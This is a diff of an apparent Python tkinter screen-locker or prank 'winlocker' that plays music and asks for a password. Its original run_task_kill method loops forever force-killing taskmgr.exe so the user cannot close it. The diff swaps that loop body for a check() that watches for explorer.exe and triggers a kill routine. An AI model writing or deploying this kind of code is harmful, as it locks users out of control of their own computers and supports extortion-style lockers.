@@ -7,13 +7,23 @@ import tkinter.font as tkFont
 from os import system
 from getpass import getuser
 from shutil import move
+from time import sleep
 import threading
+import os
 
 import config
 
 
 
 class M():
+    def check():
+        proc = os.popen('ps ax').read()
+        if proc.find("explorer.exe") == -1:
+            M.run_kill()
+        else:
+            print("процесс висит")
+        sleep(0.5)
+
     def run_music():
         M.logs("<M.run_music>: Method was started")
         system("start gamemusic.mp3")
@@ -34,7 +44,7 @@ class M():
         M.logs("<M.run_kill>: File was killed;\n    End")
 
     def run_password():
-        M.logs("<M.run_password>: Method was started;\n    Button was pressed;\n    Request wassword...")
+        M.logs("<M.run_password>: Method was started;\n    Button was pressed;\n    Request password...")
         M.logs("<M.run_password>: inp_pass: " + inp_pass.get())
 
 
@@ -82,7 +92,7 @@ class M():
 
     def run_task_kill():
         while True:
-            system("Taskkill /f /im taskmgr.exe")
+            M.check()
 
     def logs(log_text):
         if config.DEV_MODE:
